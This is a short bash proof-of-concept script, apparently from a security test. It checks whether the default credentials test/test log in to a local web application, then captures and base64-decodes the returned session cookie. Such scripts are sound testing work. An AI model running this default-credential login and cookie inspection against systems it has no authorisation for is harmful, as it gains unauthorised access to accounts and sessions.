#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Target: http://localhost:8080/login
# Purpose: Demonstrate that default credentials (test/test) provide authenticated access

TARGET_URL="http://localhost:8080/login"
USERNAME="test"
PASSWORD="test"

echo "[*] Testing default credentials vulnerability (test/test)"
echo "[*] Target: $TARGET_URL"
echo ""

# Attempt login with default credentials
echo "[*] Attempting authentication with username: $USERNAME, password: $PASSWORD"
RESPONSE=$(curl -s -i -X POST "$TARGET_URL" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Extract session cookie and HTTP status
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "session=" | head -1)
LOCATION=$(echo "$RESPONSE" | grep -i "Location:" | head -1)

echo "[*] Analysis:"
echo "HTTP Status: $HTTP_STATUS"
echo "Location Header: $LOCATION"
echo "Session Cookie: $SESSION_COOKIE"
echo ""

# Check for successful authentication indicators
if echo "$HTTP_STATUS" | grep -q "302\|200"; then
  if echo "$SESSION_COOKIE" | grep -q "session="; then
    echo "[+] SUCCESS: Authentication bypass confirmed!"
    echo "[+] Session cookie received: $(echo "$SESSION_COOKIE" | grep -o 'session=[^;]*')"
    
    # Extract and decode the session cookie value
    COOKIE_VALUE=$(echo "$SESSION_COOKIE" | grep -o 'session=[^;]*' | cut -d'=' -f2)
    echo "[+] Session cookie value: $COOKIE_VALUE"
    
    # Attempt to decode the session (note: may be encoded, not decrypted)
    if command -v base64 &> /dev/null; then
      echo "[*] Attempting to decode session cookie..."
      DECODED=$(echo "$COOKIE_VALUE" | cut -d'.' -f1 | base64 -d 2>/dev/null || echo "Could not decode")
      echo "[*] Decoded payload (first part): $DECODED"
    fi
    
    exit 0
  fi
fi

if echo "$HTTP_STATUS" | grep -q "403\|401\|400"; then
  echo "[-] FAILED: Authentication was rejected"
  echo "[-] The default credentials (test/test) do not provide access"
  exit 1
fi

echo "[-] UNKNOWN: Could not determine if authentication succeeded"
exit 1